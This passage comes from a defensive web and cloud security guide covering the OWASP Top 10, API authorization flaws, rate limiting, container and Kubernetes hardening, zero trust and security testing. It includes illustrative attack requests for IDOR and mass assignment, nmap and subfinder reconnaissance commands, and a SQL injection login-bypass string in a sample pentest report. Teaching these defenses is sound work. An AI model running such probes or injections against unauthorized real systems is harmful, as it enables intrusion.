  ⑥ Post-Incident:
     → Write incident report
     → Post-mortem review
     → Implement recurrence prevention measures
     → Update security policies

Security log design:
  Events to record:
  → Authentication success/failure
  → Authorization denial
  → Input validation failure
  → Application errors
  → Admin operations
  → Data access (read/modify/delete)

  Information to include in logs:
  → Timestamp (UTC)
  → Event type
  → Source IP, user ID
  → Request path, method
  → Status code
  → User-Agent

  Information NOT to include in logs:
  → Passwords (before hashing)
  → Session tokens
  → Credit card numbers
  → Unnecessary PII (personally identifiable information)
```

---

## 10. OWASP Top 10 (2021)

```
OWASP Top 10 Web Application Security Risks (2021):

  A01: Broken Access Control
    → Missing authorization checks, IDOR
    → Defense: Centralize authorization checks, testing

  A02: Cryptographic Failures
    → Transmitting/storing sensitive data in plaintext
    → Defense: Enforce TLS, appropriate encryption

  A03: Injection
    → SQLi, XSS, command injection
    → Defense: Parameterization, escaping, WAF

  A04: Insecure Design
    → Lack of security consideration at design stage
    → Defense: Threat modeling, secure design patterns

  A05: Security Misconfiguration
    → Default settings, unnecessary features enabled
    → Defense: Hardening, regular configuration reviews

  A06: Vulnerable and Outdated Components
    → Using libraries with known vulnerabilities
    → Defense: Dependency management, SCA, auto-updates

  A07: Identification and Authentication Failures
    → Brute force, weak passwords, poor session management
    → Defense: MFA, rate limiting, secure session management

  A08: Software and Data Integrity Failures
    → Supply chain attacks, CI/CD pipeline compromise
    → Defense: Signature verification, SBOM, code review

  A09: Security Logging and Monitoring Failures
    → Unable to detect attacks
    → Defense: Comprehensive logging, SIEM, alerts

  A10: Server-Side Request Forgery (SSRF)
    → Unauthorized access to internal resources
    → Defense: URL validation, network restrictions
```

---

## 11. Practical API Security

### 11.1 API Authentication/Authorization Attacks and Defenses

```
API-specific attack patterns:

① Broken Object Level Authorization (BOLA / IDOR):
  → Directly accesses another user's resource

  Attack example:
  GET /api/users/123/orders   ← legitimate user (ID: 123)
  GET /api/users/124/orders   ← just changing ID reveals another user's orders

  Defense:
  // Object-level authorization check in middleware
  async function authorizeResourceAccess(req, res, next) {
    const requestedUserId = parseInt(req.params.userId);
    const authenticatedUserId = req.user.id;

    if (requestedUserId !== authenticatedUserId) {
      // Check admin privilege
      if (!req.user.roles.includes('admin')) {
        return res.status(403).json({
          error: 'Forbidden',
          message: 'You do not have access to this resource'
        });
      }
    }
    next();
  }

  // Apply to route
  app.get('/api/users/:userId/orders',
    authenticate,
    authorizeResourceAccess,
    getOrders
  );

② Broken Function Level Authorization (BFLA):
  → General user accesses admin API

  Attack example:
  POST /api/admin/users/delete   ← directly calls admin endpoint
  PUT /api/users/123/role        ← escalates own role

  Defense:
  // Role-based access control middleware
  function requireRole(...roles) {
    return (req, res, next) => {
      if (!roles.some(role => req.user.roles.includes(role))) {
        logger.warn('Unauthorized role access attempt', {
          userId: req.user.id,
          requiredRoles: roles,
          userRoles: req.user.roles,
          path: req.path,
          ip: req.ip
        });
        return res.status(403).json({ error: 'Insufficient permissions' });
      }
      next();
    };
  }

  app.delete('/api/admin/users/:id',
    authenticate,
    requireRole('admin', 'super_admin'),
    deleteUser
  );

③ Mass Assignment:
  → Includes unintended fields in the request body

  Attack example:
  PUT /api/users/123
  {
    "name": "Taro",
    "email": "taro@example.com",
    "role": "admin",           ← added field
    "is_verified": true         ← added field
  }

  Defense:
  // Restrict fields using a whitelist approach
  const allowedFields = ['name', 'email', 'avatar_url'];

  function sanitizeInput(body, allowedFields) {
    const sanitized = {};
    for (const field of allowedFields) {
      if (body[field] !== undefined) {
        sanitized[field] = body[field];
      }
    }
    return sanitized;
  }

  app.put('/api/users/:id', authenticate, async (req, res) => {
    const sanitizedData = sanitizeInput(req.body, allowedFields);
    await User.update(req.params.id, sanitizedData);
    res.json({ message: 'Updated successfully' });
  });
```

### 11.2 Rate Limiting Implementation Patterns

```
Hierarchical rate limiting design:

① Global rate limit:
  → Applied to all endpoints
  → 1000 req/min per IP

② Per-endpoint rate limit:
  → Auth endpoints: 5 req/min
  → Search API: 30 req/min
  → General API: 100 req/min

③ Per-user rate limit:
  → Free plan: 100 req/hour
  → Paid plan: 10,000 req/hour
  → Enterprise: 100,000 req/hour
```

```javascript
// Token Bucket algorithm rate limiting (using Redis)
const Redis = require('ioredis');
const redis = new Redis();

async function tokenBucketRateLimit(key, maxTokens, refillRate, refillInterval) {
  const now = Date.now();
  const bucketKey = `ratelimit:${key}`;

  // Process atomically with a Lua script
  const luaScript = `
    local bucket = redis.call('HMGET', KEYS[1], 'tokens', 'last_refill')
    local tokens = tonumber(bucket[1]) or tonumber(ARGV[1])
    local last_refill = tonumber(bucket[2]) or tonumber(ARGV[4])

    -- Refill tokens
    local elapsed = tonumber(ARGV[4]) - last_refill
    local refill_count = math.floor(elapsed / tonumber(ARGV[3])) * tonumber(ARGV[2])
    tokens = math.min(tonumber(ARGV[1]), tokens + refill_count)

    -- Consume a token
    if tokens > 0 then
      tokens = tokens - 1
      redis.call('HMSET', KEYS[1], 'tokens', tokens, 'last_refill', ARGV[4])
      redis.call('EXPIRE', KEYS[1], 3600)
      return {1, tokens}
    else
      return {0, 0}
    end
  `;

  const [allowed, remaining] = await redis.eval(
    luaScript, 1, bucketKey,
    maxTokens, refillRate, refillInterval, now
  );

  return {
    allowed: allowed === 1,
    remaining: remaining,
    retryAfter: allowed === 0 ? Math.ceil(refillInterval / 1000) : 0
  };
}

// Use as middleware
async function rateLimitMiddleware(req, res, next) {
  const key = req.user ? `user:${req.user.id}` : `ip:${req.ip}`;
  const result = await tokenBucketRateLimit(key, 100, 10, 60000);

  res.set({
    'X-RateLimit-Limit': '100',
    'X-RateLimit-Remaining': result.remaining.toString(),
    'X-RateLimit-Reset': new Date(Date.now() + 60000).toISOString()
  });

  if (!result.allowed) {
    res.set('Retry-After', result.retryAfter.toString());
    return res.status(429).json({
      error: 'Too Many Requests',
      retryAfter: result.retryAfter
    });
  }

  next();
}
```

### 11.3 Safe API Key Management

```
API key management best practices:

① Key generation:
  → At least 256 bits of entropy
  → Use a prefix to identify the type

  // Node.js
  const crypto = require('crypto');
  function generateApiKey(prefix = 'sk') {
    const key = crypto.randomBytes(32).toString('hex');
    return `${prefix}_${key}`;
    // Example: sk_a1b2c3d4e5f6... (68 characters)
  }

② Key storage:
  → Store hashed (SHA-256)
  → Show the raw key only at generation time
  → Display only prefix + last 4 characters: sk_****...abcd

③ Key rotation:
  → Regular rotation (90 days recommended)
  → Grace period for old keys (72 hours)
  → Automated rotation in CI/CD

④ Key privilege restrictions:
  → Scopes (read, write, admin)
  → IP address restrictions
  → Expiration date
  → Referrer restrictions (for frontend)
```

---

## 12. Container and Cloud Environment Security

### 12.1 Container Security

```
Container-specific attack vectors:

① Container escape:
  → Access the host OS from within a container
  → Caused by vulnerable kernel versions or privileged containers

  Defense:
  # Dockerfile security best practices
  FROM node:20-alpine AS builder
  WORKDIR /app
  COPY package*.json ./
  RUN npm ci --only=production

  FROM node:20-alpine
  # Run as non-root user
  RUN addgroup -S appgroup && adduser -S appuser -G appgroup
  WORKDIR /app
  COPY --from=builder /app/node_modules ./node_modules
  COPY . .

  # Make the filesystem read-only
  RUN chmod -R 555 /app

  USER appuser

  # Security flags:
  # --read-only: prevent filesystem changes
  # --no-new-privileges: prevent privilege escalation
  # --cap-drop=ALL: drop all capabilities

② Image vulnerabilities:
  → Known vulnerabilities in the base image
  → Inclusion of unnecessary packages

  Defense:
  # Image scanning
  $ docker scout cves my-app:latest
  $ trivy image my-app:latest
  $ grype my-app:latest

  # Use Alpine / Distroless base images
  FROM gcr.io/distroless/nodejs20-debian12
  # → Minimal image that does not even include a shell

③ Secret leakage:
  → Secrets baked into the Docker image
  → Visible via docker history

  Defense:
  # BAD: secrets in environment variables
  ENV DATABASE_URL=postgres://user:pass@host/db

  # GOOD: inject at runtime
  # docker run -e DATABASE_URL=... my-app
  # or Kubernetes Secrets / AWS Secrets Manager
```

### 12.2 Kubernetes Security

```
Kubernetes-specific attacks and defenses:

① RBAC misconfiguration:
  → Default ServiceAccount has excessive privileges
  → Unnecessary Pods granted cluster-admin

  Defense:
  # Least-privilege ServiceAccount
  apiVersion: v1
  kind: ServiceAccount
  metadata:
    name: my-app-sa
    namespace: production
  automountServiceAccountToken: false  # Disable if not needed

  # Minimal RBAC rules
  apiVersion: rbac.authorization.k8s.io/v1
  kind: Role
  metadata:
    name: my-app-role
    namespace: production
  rules:
  - apiGroups: [""]
    resources: ["configmaps"]
    verbs: ["get", "list"]  # Read-only

② No NetworkPolicy set:
  → Unrestricted inter-Pod communication
  → Lateral movement from a compromised Pod

  Defense:
  # Default deny + explicit allow
  apiVersion: networking.k8s.io/v1
  kind: NetworkPolicy
  metadata:
    name: default-deny-all
    namespace: production
  spec:
    podSelector: {}  # Applies to all Pods
    policyTypes:
    - Ingress
    - Egress

  # Allow only specific Pod-to-Pod communication
  apiVersion: networking.k8s.io/v1
  kind: NetworkPolicy
  metadata:
    name: allow-frontend-to-api
    namespace: production
  spec:
    podSelector:
      matchLabels:
        app: api-server
    ingress:
    - from:
      - podSelector:
          matchLabels:
            app: frontend
      ports:
      - protocol: TCP
        port: 8080

③ Pod Security Standards:
  # Restricted level (most strict)
  apiVersion: v1
  kind: Pod
  metadata:
    name: secure-pod
  spec:
    securityContext:
      runAsNonRoot: true
      runAsUser: 1000
      fsGroup: 1000
      seccompProfile:
        type: RuntimeDefault
    containers:
    - name: app
      image: my-app:latest
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop: ["ALL"]
      resources:
        limits:
          memory: "256Mi"
          cpu: "500m"
        requests:
          memory: "128Mi"
          cpu: "250m"
```

---

## 13. Zero Trust Security

```
Zero Trust Architecture principles:

Traditional model (perimeter security):
  Internet → Firewall → Internal network (trusted)
  → Once inside, access to all resources is possible
  → Vulnerable to insider threats and lateral movement

Zero Trust model:
  "Never Trust, Always Verify"

  Principles:
  ① Explicit verification: authenticate and authorize all access
  ② Least privilege access: grant only the minimum necessary privileges
  ③ Assume breach: minimize damage even if breached

  Architecture:
  ┌──────────────────────────────────────────────┐
  │  User / Device                               │
  │    │                                         │
  │    ▼                                         │
  │  Policy Enforcement Point (PEP)              │
  │    │ ← validates every request               │
  │    │                                         │
  │    ├── Device health check                   │
  │    │   → OS version, patch status            │
  │    │   → Disk encryption, antivirus          │
  │    │                                         │
  │    ├── User authentication                   │
  │    │   → MFA required                        │
  │    │   → Contextual auth (location, time,    │
  │    │       behavior)                         │
  │    │                                         │
  │    ├── Authorization check                   │
  │    │   → ABAC (attribute-based)              │
  │    │   → Policy evaluated per request        │
  │    │                                         │
  │    ▼                                         │
  │  Resources (microsegmentation)               │
  │    → Each resource has its own security      │
  │      boundary                               │
  │    → End-to-end encryption (mTLS)            │
  │    → All communication is logged             │
  └──────────────────────────────────────────────┘

  Implementation elements:
  ① Identity Provider (IdP):
    → Okta, Azure AD, Google Workspace
    → SSO + MFA + device trust

  ② Network access control:
    → BeyondCorp (Google)
    → Cloudflare Access / Zscaler
    → VPN-less: per-application access control

  ③ Microsegmentation:
    → Kubernetes NetworkPolicy
    → AWS Security Groups / Azure NSG
    → Service mesh (Istio / Linkerd)

  ④ Continuous monitoring and analysis:
    → SIEM (Splunk, Elastic Security)
    → UEBA (User and Entity Behavior Analytics)
    → Automated blocking via anomaly detection
```

---

## 14. Practical Security Testing

### 14.1 SAST / DAST / SCA

```
Types of security testing:

① SAST (Static Application Security Testing):
  → Static analysis of source code
  → Detects vulnerabilities at the development stage

  Tools:
  - Semgrep: custom rules, OSS
  - SonarQube: multi-language support, CI/CD integration
  - CodeQL (GitHub): GitHub Advanced Security

  CI/CD integration example (GitHub Actions):
  - name: Run Semgrep
    uses: returntocorp/semgrep-action@v1
    with:
      config: >-
        p/owasp-top-ten
        p/javascript
        p/typescript

② DAST (Dynamic Application Security Testing):
  → Testing against a running application
  → Simulates actual attacks

  Tools:
  - OWASP ZAP: free, proxy-based
  - Burp Suite: commercial, feature-rich
  - Nuclei: template-based, fast

  ZAP automated scan:
  $ docker run -t owasp/zap2docker-stable zap-baseline.py \
    -t https://app.example.com \
    -r report.html

③ SCA (Software Composition Analysis):
  → Detects vulnerabilities in dependent libraries

  Tools:
  - npm audit / yarn audit
  - Snyk: commercial, auto-creates fix PRs
  - Dependabot: GitHub integration
  - Trivy: container images + filesystem

  Automation:
  $ npm audit --audit-level=high
  $ trivy fs --severity HIGH,CRITICAL .
```

### 14.2 Basics of Penetration Testing

```
Penetration testing flow:

  1. Scope definition:
     → Target systems/network scope
     → Test method (black box / white box)
     → Test period and constraints

  2. Reconnaissance:
     → Passive: OSINT, DNS enumeration, WHOIS
     → Active: port scanning, service enumeration

     $ nmap -sV -sC -p- target.example.com
     $ subfinder -d example.com | httpx -probe

  3. Vulnerability identification:
     → Automated scanning + manual verification
     → Auth bypass, injection, misconfiguration

  4. Exploitation:
     → Proof of concept for discovered vulnerabilities
     → Confirm scope of impact
     → Attempt lateral movement

  5. Report writing:
     → Prioritize findings (Critical/High/Medium/Low)
     → Record detailed reproduction steps
     → Present remediation recommendations

  Report template:
  ┌──────────────────────────────────────────┐
  │ Vulnerability ID: VULN-2024-001           │
  │ Title: SQL Injection (Authentication Bypass)│
  │ Severity: Critical (CVSS 9.8)             │
  │ Impact: All database data can be stolen   │
  │ Reproduction steps:                       │
  │   1. Access /login endpoint               │
  │   2. Enter username: ' OR 1=1--           │
  │   3. Any password                         │
  │   4. Successfully logged in as admin      │
  │ Remediation recommendations:              │
  │   - Use Prepared Statements               │
  │   - Add input validation                  │
  │   - Add WAF rule (interim measure)        │
  └──────────────────────────────────────────┘
```

---

## FAQ

### Q1: What is the minimum set of security headers to configure?

The minimum five security headers to configure are: (1) `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` to enforce HTTPS. (2) `Content-Security-Policy: default-src 'self'; script-src 'self'` to prevent XSS. (3) `X-Content-Type-Options: nosniff` to prevent MIME type sniffing. (4) `X-Frame-Options: DENY` to prevent clickjacking. (5) `Referrer-Policy: strict-origin-when-cross-origin` to prevent Referer information leakage. Applying these to all pages defends against the majority of common web application attacks. In Nginx, use the `add_header` directive; in Express.js, the `helmet` middleware can set them all at once.

### Q2: What should you do first when you detect a DDoS attack?

The initial response when a DDoS attack is detected: (1) First, identify the type of attack (L3/L4 volumetric or L7 application attack). If network bandwidth is saturated, it is a volumetric attack; if server CPU/memory is under pressure, it is an application attack. (2) Enable "Under Attack" mode on your CDN/WAF provider (Cloudflare, AWS Shield, etc.). (3) Analyze the characteristics of attack source IPs; if the attack is from a specific country or ASN, apply geo-blocking or ASN blocking. (4) At the application level, tighten rate limits and introduce CAPTCHA challenges. (5) Preserve attack logs and contact the security team of your ISP or cloud provider.

### Q3: Does using an ORM completely prevent SQL injection?

Even when using an ORM, the risk of SQL injection is not completely eliminated. Standard CRUD operations where the ORM's query builder automatically parameterizes are safe, but the following cases still have vulnerabilities: (1) Building custom SQL statements or using raw methods with string concatenation. (2) ORM bugs or specific operators that may inadvertently allow injection (e.g., MongoDB's `$where` operator). (3) Dynamic SQL inside stored procedures. As a countermeasure, even when using an ORM, always validate user input and use placeholders when executing raw queries.

### Q4: What is the difference between XSS and CSRF? Why do we need to defend against both?

XSS (Cross-Site Scripting) is an attack that executes malicious scripts in the browser, while CSRF (Cross-Site Request Forgery) is an attack that causes an authenticated user to send unintended requests. XSS means "the attacker's code runs in the user's browser," while CSRF means "the user's own browser sends a legitimate-looking request" — these are fundamentally different. If XSS succeeds, CSRF tokens can also be stolen, so XSS defense is a prerequisite for CSRF defense. Both defenses are needed because CSRF tokens alone cannot prevent XSS, and CSP alone cannot prevent CSRF. Following the principle of Defense in Depth, combining CSP + escaping (XSS defense) with CSRF tokens + SameSite Cookie (CSRF defense) is mandatory.

### Q5: What preparations can be made against zero-day vulnerabilities?

Complete defense against zero-day vulnerabilities (vulnerabilities with no patch available) is impossible, but preparations to minimize damage are possible. (1) Deploy a WAF to block common attack patterns and maintain the ability to apply virtual patches. (2) Use network segmentation and microsegmentation to limit lateral movement from a compromised component. (3) Use RASP (Runtime Application Self-Protection) to detect anomalous behavior from inside the application in real time. (4) Strictly enforce the principle of least privilege so each component can access only the minimum necessary resources. (5) Establish an incident response plan in advance and build a CI/CD pipeline capable of applying patches within 24 hours of a vulnerability disclosure.

---

## Summary

| Attack | Defense |
|--------|---------|
| MITM | HTTPS + HSTS + HSTS Preload |
| DNS Poisoning | DNSSEC + Registrar protection |
| DDoS | CDN/WAF + Rate limiting + Anycast |
| XSS | CSP + Escaping + HttpOnly + Trusted Types |
| CSRF | CSRF token + SameSite Cookie |
| SQLi | Prepared Statement + ORM |
| SSRF | URL whitelist + IP validation + IMDSv2 |
| CORS | Explicit origin allowlist |
| Supply chain | Dependency audit + SCA + SBOM |
| Misconfiguration | Security headers + Hardening |

---

## Next Guides to Read

---

## References
1. OWASP. "OWASP Top 10." 2021.
2. NIST. "SP 800-53: Security and Privacy Controls." 2020.
3. NIST. "SP 800-61: Computer Security Incident Handling Guide." 2012.
4. RFC 7617. "The 'Basic' HTTP Authentication Scheme." IETF, 2015.
5. RFC 6454. "The Web Origin Concept." IETF, 2011.
6. W3C. "Content Security Policy Level 3." 2023.
7. Cloudflare. "DDoS Attack Trends." 2024.
8. OWASP. "Cross-Site Scripting Prevention Cheat Sheet." 2024.
9. OWASP. "SQL Injection Prevention Cheat Sheet." 2024.
10. OWASP. "Server-Side Request Forgery Prevention Cheat Sheet." 2024.
